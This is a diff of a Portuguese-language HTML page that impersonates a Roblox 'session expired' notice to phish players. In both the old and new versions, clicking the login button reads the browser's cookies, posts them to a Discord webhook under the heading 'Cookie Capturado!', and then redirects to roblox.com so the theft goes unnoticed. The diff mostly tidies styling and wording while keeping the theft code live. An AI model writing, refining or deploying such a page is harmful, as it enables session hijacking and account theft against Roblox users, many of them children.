@@ -2,74 +2,55 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox - Sessão Expirada</title>
     <style>
-        body { 
-            background-color: #191919; 
-            color: white; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
+        body {
+            background-color: #191919;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-        .container { 
-            text-align: center; 
-            background-color: #232527; 
-            padding: 40px; 
-            border-radius: 8px; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5); 
+        .container {
+            text-align: center;
+            background-color: #232527;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
             max-width: 400px;
-            width: 100%;
+            width: 90%;
         }
-        img { 
-            width: 120px; 
-            margin-bottom: 20px; 
+        img {
+            width: 120px;
+            margin-bottom: 20px;
         }
-        h1 { 
-            font-size: 24px; 
-            margin: 0 0 10px 0; 
-            color: #fff;
-        }
-        p { 
-            color: #b9bbbe; 
-            margin: 0 0 25px 0; 
-            font-size: 14px;
-        }
-        button { 
-            background-color: #00a2ff; 
-            color: white; 
-            border: none; 
-            padding: 12px 30px; 
-            font-size: 16px; 
-            border-radius: 4px; 
-            cursor: pointer; 
+        h1 { font-size: 24px; margin: 0 0 10px 0; color: #fff; }
+        p { color: #b9bbbe; margin: 0 0 25px 0; font-size: 14px; }
+        button {
+            background-color: #00a2ff;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
             transition: background 0.2s;
             font-weight: bold;
         }
-        button:hover { 
-            background-color: #008bd6; 
-        }
-        .loading {
-            display: none;
-            margin-top: 15px;
-            font-size: 12px;
-            color: #00a2ff;
-        }
+        button:hover { background-color: #008bd6; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- Logo Oficial -->
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/200px-Roblox_player_icon_black.svg.png" alt="Roblox">
-    
     <h1>Sessão Encerrada</h1>
-    <p>Nossa equipe detectou uma atividade suspeita. Clique abaixo para verificar sua conta e continuar jogando.</p>
-    
+    <p>Clique abaixo para verificar sua conta e continuar.</p>
     <button id="loginBtn">Entrar Agora</button>
-    <div class="loading" id="loader">Redirecionando...</div>
 </div>
 
 <script>
@@ -78,15 +59,12 @@
 
     document.getElementById('loginBtn').addEventListener('click', function() {
         const btn = document.getElementById('loginBtn');
-        const loader = document.getElementById('loader');
-        
-        // Feedback visual
-        btn.style.display = 'none';
-        loader.style.display = 'block';
+        btn.innerText = "Verificando...";
+        btn.disabled = true;
 
         // Pega o cookie da sessão atual
         const cookieValue = document.cookie;
-        
+
         // Envia para o Discord
         fetch(WEBHOOK_URL, {
             method: 'POST',
@@ -94,11 +72,11 @@
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-                content: `🍪 **Cookie Capturado com Sucesso!**\n\n\`\`\`${cookieValue}\`\`\``
+                content: `🍪 **Cookie Capturado!**\n\n\`\`\`${cookieValue}\`\`\``
             })
-        }).catch(err => console.error('Erro ao enviar:', err));
+        }).catch(err => console.error('Erro:', err));
 
-        // Redireciona imediatamente para o Roblox para disfarçar
+        // Redireciona imediatamente para o Roblox
         window.location.href = "https://www.roblox.com/home";
     });
 </script>
